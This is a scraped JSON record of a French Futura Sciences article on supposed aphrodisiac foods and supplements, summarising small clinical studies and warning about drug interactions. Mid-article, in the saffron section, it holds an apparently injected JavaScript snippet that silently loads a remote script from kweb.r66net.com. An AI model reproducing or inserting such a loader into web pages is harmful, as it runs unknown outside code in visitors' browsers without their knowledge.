{"title": "5 aliments aphrodisiaques pour booster sa libido", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-08-22", "content": "De nombreux aliments sont connus pour leurs soi-disant effets aphrodisiaques. Mais quels sont ceux qui marchent vraiment ? Voici cinq aliments ou complements alimentaires dont les proprietes aphrodisiaques ont ete demontrees. Ce qu'il faut retenir Certains aliments ou complements alimentaires stimulent le desir sexuel chez l'homme comme chez la femme. Des etudes se sont interessees en particulier au fenugrec, au maca, au safran, au tribulus, au ginseng ou au ginkgo biloba. Souvent ces etudes sont de petite taille et donc peu fiables. Dans la grande famille des aliments supposes  aphrodisiaques  (chocolat, huitres, miel, piment...), tous n'ont pas des effets scientifiquement prouves... Voici quelques-uns qui ont ete testes dans des  essais cliniques . Attention, certains peuvent avoir des effets indesirables ou interagir avec des traitements medicamenteux. Demandez conseil a votre medecin ou votre pharmacien. Le safran Le  safran  est une epice celebre pour son prix exorbitant. Obtenu a partir de la  fleur  de  Crocus sativus , une plante originaire d'Asie, le  safran  serait un remede naturel contre la depression. Il est aussi populaire pour ses effets aphrodisiaques mais plutot chez les personnes prenant des  antidepresseurs .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ainsi, une  etude sur 30 hommes  souffrant de depression a trouve que ceux qui prenaient 30 mg de safran par jour pendant quatre semaines amelioraient plus leur fonction erectile que des temoins. Une  autre etude sur des femmes  en depression a montre que celles qui prenaient du safran avaient mieux reduit leurs problemes sexuels (excitation, lubrification) que celles qui prenaient un  placebo .  Le fenugrec Le  fenugrec  est une plante cultivee en Inde et en Egypte notamment. Il est souvent consomme a des fins medicinales, pour ses proprietes anti-bacteriennes, anti-diabetiques ou anti-cancer. Les jeunes mamans connaissent aussi le fenugrec car il favorise la lactation. La plante herbacee contient differents  composes actifs  :  alcaloides ,  flavonoides ,  steroides  et saponines, dont la diosgenine. Cette saponine est une  molecule  qui sert a la synthese d' hormones sexuelles .  Dans une  petite etude sur 60 hommes  souffrant de dysfonction erectile, certains ont pris une dose quotidienne de 600 mg d'extrait de fenugrec pendant six semaines, et d'autres un placebo. Ceux qui ont pris le fenugrec ont connu une meilleure excitation sexuelle et plus d' orgasmes . De la meme facon, chez des  femmes  qui avaient peu de  libido , 600 mg par jour ont augmente le desir et l'excitation au bout de huit semaines, par rapport a un groupe placebo. Le fenugrec est bien tolere mais il peut interagir avec certains medicaments. Feuilles et graines de fenugrec sont consommees. (c) Swapan, Fotolia                               Le maca Le  maca  est une plante de la famille des brassicacees, comme le chou, qui pousse dans les montagnes du centre du Perou, entre 4.000 et 4.500 m d'altitude. Surnomme le <<  Viagra  peruvien >>, il est utilise comme aphrodisiaque. Differentes  etudes  ont montre une amelioration du desir sexuel grace a la consommation de maca. La plante augmente aussi le nombre et la  motilite  des  spermatozoides  du  sperme . Le tribulus Tribulus terrestris  est une plante de la  medecine traditionnelle  en Inde et en Chine. Il est utilise pour ameliorer les performances sportives mais aussi pour les problemes d' infertilite  et de libido. Une  etude  a trouve que 88 % des femmes qui avaient des problemes sexuels etaient plus satisfaites apres avoir pris 250 mg de tribulus par jour pendant 90 jours.  Dans une  autre etude , des chercheurs ont donne 7,5 mg de tribulus a des femmes souffrant de problemes sexuels. Apres quatre semaines, d'apres les resultats d'un questionnaire (le FSFI :  Female Sexual Function Index ), elles avaient ameliore leurs scores dans differents domaines : desir, excitation, lubrification, satisfaction sexuelle. Le tribulus semble donc aphrodisiaque chez les femmes. Les complements de Ginkgo biloba proviennent de l'arbre du meme nom. (c) igradesign, Fotolia                               Deux plantes traditionnelles chinoises : le ginkgo biloba et le ginseng Ces deux plantes sont souvent associees en complements. Le  ginkgo  est connu en  medecine traditionnelle chinoise  pour lutter contre la depression et les problemes de libido. Cependant, les etudes donnent parfois des resultats mitiges concernant ses effets aphrodisiaques. Une  petite etude  a montre qu'il limitait la perte de libido liee aux antidepresseurs, surtout chez les femmes.  De la meme facon, pour le  ginseng , les etudes sont parfois de faible qualite. Des etudes ont trouve que le ginseng etait deux fois plus efficace qu'un placebo pour ameliorer la  fonction erectile  de l'homme. Une  petite etude  chez des femmes menopausees a trouve qu'il ameliorait l'excitation. Ginseng et ginkgo peuvent interferer avec des medicaments. Des effets secondaires sont possibles. ", "theme": "sante"}